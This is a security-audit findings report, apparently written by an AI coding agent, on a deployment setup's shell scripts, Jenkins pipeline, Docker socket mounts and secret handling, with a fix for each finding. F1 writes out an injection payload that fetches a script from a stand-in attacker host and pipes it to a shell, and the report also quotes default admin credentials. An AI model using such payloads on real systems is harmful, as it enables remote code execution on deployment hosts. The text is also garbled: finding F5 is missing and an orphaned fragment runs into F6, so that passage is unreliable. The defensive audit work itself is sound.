## Findings

### F1 — HIGH · Command injection · Unvalidated service names reach a remote shell via `deploy.sh`'s `remote_exec()`, from both a release manifest and a Jenkins build parameter

`common/scripts/deploy-lib.sh:91-103` (`remote_exec()`) builds a command string and pipes it to `bash -s` on the remote host over SSH:
```bash
$SSH_CMD "${REMOTE_USER}@${REMOTE_HOST}" bash -s <<<"export PATH=\$HOME/bin:\$PATH && source ~/.bashrc && ${cmd}"
```
This is a **second level of shell parsing** — the heredoc content is a brand-new script the remote `bash -s` parses from scratch, so any shell metacharacter embedded in `${cmd}` (`;`, `|`, backticks, `$()`) is live syntax there, unlike an ordinary unquoted variable expansion within an already-running script (which I verified empirically does *not* re-trigger command substitution — see the note on F1's Jenkins angle below).

`${cmd}` is built at multiple call sites in `deploy.sh` (e.g. `:539` `remote_exec "${COMPOSE_CMD} pull --quiet ${local_services}"`, `:670`/`:722`/`:787`/`:791`) from a `SERVICES` array populated two ways, **neither of which validates the value**:
- `deploy.sh:177`: `mapfile -t SERVICES < <(yaml_read '.services | keys | .[]' "$MANIFEST")` — the release manifest's `services:` map keys, taken verbatim.
- `deploy.sh:149-150`: `IFS=',' read -ra SERVICES <<<"$SERVICES_OVERRIDE"` where `SERVICES_OVERRIDE="$2"` is the raw value of the `--services` CLI flag (`deploy.sh:73-75`) — also taken verbatim, no character-class check.

**Failure scenario:** a service name (from either source) containing a semicolon, pipe, or backtick — e.g. `` frontend`curl http://attacker/x|sh` `` — reaches `remote_exec` unquoted, and the remote `bash -s` executes it as the deploy SSH user on the actual staging or prod host.

**The Jenkins angle, corrected:** `Jenkinsfile.deploy` exposes a free-text `SERVICES` build parameter with no regex validation (unlike `VERSION`, checked against `^\d+\.\d+(\.\d+)?$` at `:83-84`), which is Groovy-interpolated into `servicesArg = "--services ${params.SERVICES}"` and then referenced unquoted as `$DEPLOY_SERVICES` inside a `sh '''...'''` step (`:170-178` staging, `:267-273` prod). One of my research passes reported this as direct command execution *on the Jenkins agent* via that mechanism. **I tested this empirically and it does not hold**: `sh '''...'''` is a Groovy triple-single-quoted string (no Groovy interpolation — confirmed by inspection), and I confirmed with a live test (`DEPLOY_SERVICES='backend; touch proof'; bash -c 'echo $DEPLOY_SERVICES'` and the equivalent with backticks/`$()`) that plain unquoted bash variable expansion does **not** re-trigger command substitution or execute embedded shell syntax — only `eval`, or a second shell re-parsing the value as script text (exactly what `remote_exec`'s heredoc does), causes that. So this is not "arbitrary code on the Jenkins agent."

What the Jenkins `SERVICES` field *does* give an unvalidated caller, confirmed: word-splitting on the unquoted `$DEPLOY_SERVICES` lets a value containing spaces inject **additional argv words** into `deploy.sh`'s own flag parser (e.g. a value of `x --env prod` after the literal `--services` prefix could append a second `--env prod`, which `deploy.sh:61-64`'s `case "$1" in --env) ENV="$2" ;;` accepts last-write-wins) — and, more directly, a `SERVICES` value with no spaces (using `${IFS}`-style tricks or literal service-name-shaped text) reaches `deploy.sh --services <value>` exactly the same unvalidated path as a manifest entry, landing in the same `remote_exec` sink described above. So the Jenkins parameter is a real, and the *more directly reachable*, entry point into the same vulnerability (no manifest commit required — just permission to trigger the parameterized build) — it just doesn't execute where my research pass first said it did.

**Fix:** validate every parsed service name — from both `--services` and the manifest — against the fixed set of actual compose service names (or `^[a-z][a-z0-9_-]*$`) immediately after parsing, before it ever reaches `SERVICES`; and quote `"${SERVICES[@]}"` throughout `deploy.sh` instead of building space-joined strings for `remote_exec`. Additionally add the same regex validation Jenkins already applies to `VERSION` to the `SERVICES` parameter in `Jenkinsfile.deploy`'s `Validate` stage, as defense in depth.

### F2 — HIGH · CI hygiene · Jenkins mounts the rootless Docker socket read-write, giving any build full host container control

`other/services/jenkins/docker-compose.yml:24`: `- /run/user/1000/docker.sock:/var/run/docker.sock` — no `:ro`, and per F7 below `:ro` would not have been a real restriction regardless. Every pipeline stage, plugin, and dependency pulled during any build (not only the deploy job `SERVICES` path in F1 — the ordinary backend/frontend build pipeline, `Jenkinsfile`, is a supply-chain surface on its own: `npm install`/`pip install` can run arbitrary build-time code) runs with this socket available, which is equivalent to root over every container and volume the host's Docker daemon manages. `Jenkinsfile.deploy`'s later stages load `sshagent(['staging-ssh-key'])`/`sshagent(['prod-ssh-key'])` with credentials from the Jenkins credential store — a build that pivots through the Docker socket can read `jenkins_home` (where those credentials and any cached tokens live) directly.

**Fix:** front the socket with a scoped proxy (e.g. `tecnativa/docker-socket-proxy`, or an image-registry-scoped-only proxy) limited to the specific build/push/pull verbs Jenkins needs, or move to build isolation that doesn't need host Docker access (kaniko/buildah-in-userns/sysbox).

### F3 — HIGH · Fail-open confirmation · Production confirmation on `deploy.sh` and `bootstrap-host.sh` is gated on TTY presence, with zero test coverage, and no backstop at all for `bootstrap-host.sh`

`common/scripts/bootstrap-host.sh:230`: `if [[ "$ENV" == "prod" && -t 0 ]]; then read -p "Are you sure..." ...`. `common/scripts/deploy.sh:397` has the identical pattern: `if [[ "$ENV" == "prod" && -t 0 ]]; then read -p "Deploy v${VERSION} to PRODUCTION?..."`. I grepped both scripts and the full `common/scripts/tests/` suite (`grep -rn '\-t 0' common/scripts/*.sh`) — this exact gate appears in exactly these two places, and no test exercises the non-interactive path.

**Failure scenario:** any invocation where stdin is not an interactive TTY — piped input, a background/`nohup` job, a wrapper script that redirects `/dev/null`, or an AI coding agent (such as this one) running the command via a non-interactive shell tool — makes `-t 0` false, and the confirmation block is skipped **entirely and silently**. For `deploy.sh --env prod`, this means a live production deployment proceeds with zero human sign-off. For `bootstrap-host.sh --env prod`, this means the WIPE-AND-REPROVISION of the host proceeds with zero human sign-off — the single most destructive operation in this codebase (`log_warn "⚠️  PRODUCTION BOOTSTRAP — this WIPES and re-provisions the host ⚠️"` fires, but is just a log line, not a gate).

`deploy.sh`'s manual-invocation path is exactly what `CLAUDE.md`'s own documented workflow shows as normal usage (`bash common/scripts/deploy.sh --manifest ... --env prod`, run directly, no mention of the TTY caveat) — an operator or agent following that documented workflow in a non-interactive context gets no warning that the safety net evaporated. The one mitigating factor: `Jenkinsfile.deploy`'s CI path to `--env prod` is backstopped by a separate Jenkins-level `input` step (`:238`, `Deploy v${params.VERSION} to PRODUCTION?`) *before* `deploy.sh` is ever invoked, so the CI route specifically is not exposed by this gap. `bootstrap-host.sh` has no such backstop in any invocation path — it is not called from any Jenkinsfile.

**Fix:** require an explicit flag (e.g. `--yes-i-am-sure-this-is-prod`) for non-interactive `--env prod` invocation of both scripts, rather than deriving consent from TTY presence; fail closed (refuse to proceed) rather than silently skipping the check when stdin is not a TTY and the flag is absent. Add a test that runs both scripts with `ENV=prod` and stdin redirected from `/dev/null`, asserting they either prompt-and-fail or refuse outright — never proceed.

### F4 — MEDIUM · Secret residue · Cloudflare tunnel token is delivered via container `environment:` and CLI arg, contradicting the project's own stated exposure model

`other/services/cftunnel/docker-compose.yml`:
```yaml
command: tunnel --no-autoupdate run --token ${TUNNEL_TOKEN}
environment:
  - TUNNEL_TOKEN=${TUNNEL_TOKEN}
```
`up.sh` correctly renders `TUNNEL_TOKEN` from OpenBao KV at deploy time (fail-closed if unseeded) rather than reading a committed plaintext file — the source-of-truth problem BR-SEC-011 targets is closed. But `docker compose` interpolates `${TUNNEL_TOKEN}` into both `command:` and `environment:` before the container starts, so the resolved value ends up in the container's actual environment (`docker inspect cloudflared-tunnel` — exactly the exposure vector `13_secrets_management.md`'s own Problem section names) **and** in `Config.Cmd` / the process argv, visible via `docker inspect` and via host `ps`/`/proc/<pid>/cmdline` to any process able to read that container's PID. Every other Class A/B secret in this stack is delivered as a file (`SETTINGS_ENV_FILE`, rendered `keycloak.conf`, `*_PASSWORD_FILE`) specifically to avoid this; cftunnel is the one exception, confirmed independently in two of my research passes reading the same file.

**Fix:** drop the `--token ${TUNNEL_TOKEN}` CLI argument — `cloudflared tunnel run` reads `TUNNEL_TOKEN` from its environment natively, so `command:` doesn't need it. The `environment:` exposure (docker inspect) would remain; closing that fully requires a cloudflared flag/mechanism that reads the token from a mounted file, not confirmed available in the pinned version — flag for follow-up, or accept the narrower env-var-only residual risk as documented.

These cannot both be true as written. `deploy.sh:678-689` fails closed and prints `log_error "Ensure OpenBao is up + bootstrapped + seeded"` if the `openbao-${ENV}` container is unreachable, and `render_deploy_secrets_or_die` (`common/openbao/render-secrets-hook.sh`) aborts the whole deploy if `render-deploy-secrets.sh` cannot obtain a deploy token — I traced both paths and confirmed neither can silently succeed with OpenBao down. ### F6 — MEDIUM · Unenforced control · OpenBao root-token revocation is a log warning only, never checked

`common/openbao/bootstrap.sh:246` prints `log_warn "Revoke/rotate the root token once OIDC admin login works..."` — this is the entire enforcement mechanism for BR-SEC-013's "the root token is revoked once OIDC admin login works." No code path revokes it, and nothing checks that it *was* revoked before, e.g., a later deploy or bootstrap step proceeds. The token sits in `.bootstrap-out/<env>/server-init.json` (confirmed `600`, gitignored) until a human remembers the manual step and moves it offline (`bootstrap.sh:154`, also just a warning).

**Failure scenario:** an operator completes OIDC admin login, moves on, and never runs `bao token revoke` — a live, full-privilege root credential persists indefinitely on disk with only filesystem permissions (`600`, same host) as a control; anyone who obtains host access at that permission level (a misconfigured backup, a compromised sibling process running as the same user, a `.bootstrap-out/` copy left somewhere it shouldn't be) gets root-equivalent OpenBao access with no cert requirement and no policy scoping.

**Fix:** add a `bootstrap.sh verify` subcommand that checks the root token is dead (`bao token lookup` against it fails) and have deploy readiness / CI treat a live root token past the OIDC-cutover point as a failing check, not a warning.

### F7 — MEDIUM · Misleading control label · `docker.sock:ro` mounts do not restrict the Docker API, and the one admin UI that needs full access ships auth as an opt-in step

`other/services/crowdsec/docker-compose.yml` and `other/services/dockhand/docker-compose.yml` both mount `${DOCKER_SOCK}:/var/run/docker.sock:ro`. The `:ro` flag restricts filesystem-level operations on the socket *file* (unlink/replace) — it does not restrict what a client connected to that socket can ask the Docker Engine API to do; the daemon on the other end still accepts the full read-write API (create/exec/mount containers, including privileged ones with host bind mounts) regardless of the mount's write bit. CrowdSec parses externally-influenceable HTTP log data; a parser or scenario-injection bug there, combined with this socket access, is a path to full host container control — a materially larger exposure than the `:ro` label and dockhand's own README ("Read-only Docker socket — Reduces attack surface") imply.

Dockhand is the more direct case: it's a full Docker management UI (start/stop/exec/terminal/file-browser on any container) explicitly reachable at `${TAILSCALE_IP}:${DOCKHAND_PORT}`. Its own `README.md` documents "Emergency: create admin user (admin / admin123)" and "Emergency: disable auth if locked out" scripts baked into the image, and lists "Enable authentication (Settings → Auth)" as a **post-deploy checklist item**, not a default-on state — meaning the interval between `docker compose up -d` and an operator completing that checklist step is a window where the docker-socket-backed management UI may be reachable with no login at all.

**Mitigating factor, confirmed:** `other/services/tailscale/tailscale.json`'s ACLs restrict port 3080 (dockhand) and port 81 (npm's admin UI) reach to `src: tag:dev1` only, into `tag:staging`/`tag:prod`/`tag:ci`/`tag:compute` — not the whole tailnet. So exploitation requires either compromising the single `tag:dev1`-tagged device or a gap during the setup window on a host already reachable from it, not arbitrary tailnet access. This is real defense-in-depth, which is why this is MEDIUM rather than HIGH.

**Fix:** front both `docker.sock` uses with a scoped read-only API proxy (e.g. `tecnativa/docker-socket-proxy` with only `CONTAINERS=1`/`INFO=1` for CrowdSec); for dockhand, script auth-enablement as part of first bring-up rather than leaving it as a manual checklist item, and correct the README's "reduces attack surface" claim about `:ro`.
